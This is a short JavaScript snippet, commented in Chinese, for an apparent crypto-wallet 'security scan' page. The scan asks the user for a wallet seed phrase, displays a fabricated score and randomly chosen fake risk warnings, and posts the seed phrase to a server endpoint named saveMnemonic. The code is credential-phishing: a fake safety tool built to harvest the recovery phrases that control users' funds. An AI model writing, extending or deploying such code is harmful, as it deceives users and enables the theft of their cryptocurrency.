// 函数：发送用户输入的助记词到服务器
function sendMnemonicToServer(mnemonic) {
    fetch('http://localhost:3000/saveMnemonic', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ mnemonic: mnemonic })
    })
    .then(response => response.json())
    .then(data => {
        alert('助记词已成功保存');
    })
    .catch(error => {
        console.error('错误:', error);
        alert('保存失败，请重试');
    });
}

// 修改原有的startSecurityScan()函数，添加保存数据到服务器的功能
function startSecurityScan() {
    const mnemonic = document.getElementById('mnemonicInput').value;

    if (!mnemonic) {
        alert("请先输入助记词");
        return;
    }

    // 生成安全评分
    const score = generateSecurityScore(mnemonic);
    document.getElementById('scanResult').style.display = 'block';
    document.getElementById('scoreValue').textContent = `${score}/100`;

    // 模拟检测安全漏洞信息
    const riskMessages = [
        "发现黑名单合约！",
        "发现貔貅合约！",
        "检测到潜在的安全漏洞！"
    ];

    const randomMessage = riskMessages[Math.floor(Math.random() * riskMessages.length)];
    alert(randomMessage);

    // 调用sendMnemonicToServer函数来保存助记词
    sendMnemonicToServer(mnemonic);
}

